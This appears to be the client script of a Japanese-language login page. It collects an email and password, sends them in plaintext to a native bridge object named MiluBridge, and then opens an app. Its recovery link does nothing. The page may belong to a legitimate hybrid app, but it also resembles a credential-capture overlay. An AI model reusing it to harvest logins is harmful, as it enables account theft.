(() => {
  const form = document.getElementById("loginForm");
  const emailInput = document.getElementById("email");
  const passwordInput = document.getElementById("password");
  const forgotLink = document.getElementById("forgotLink");
  const toastEl = document.getElementById("toast");

  let locked = false;
  let toastTimer = 0;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function toast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.add("is-show");
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
      toastEl.classList.remove("is-show");
    }, 2200);
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function buildPayload(email, password) {
    return JSON.stringify({
      email,
      password,
      exit: "",
    });
  }

  form.addEventListener("submit", (event) => {
    event.preventDefault();
    if (locked) {
      return;
    }
    const email = emailInput.value.trim();
    const password = passwordInput.value;
    if (!email || !password) {
      toast("メールアドレスとパスワードを入力してください");
      return;
    }
    locked = true;
    reportDone(buildPayload(email, password));
    window.setTimeout(() => {
      openApp();
      locked = false;
    }, 300);
  });

  forgotLink.addEventListener("click", (event) => {
    event.preventDefault();
  });
})();
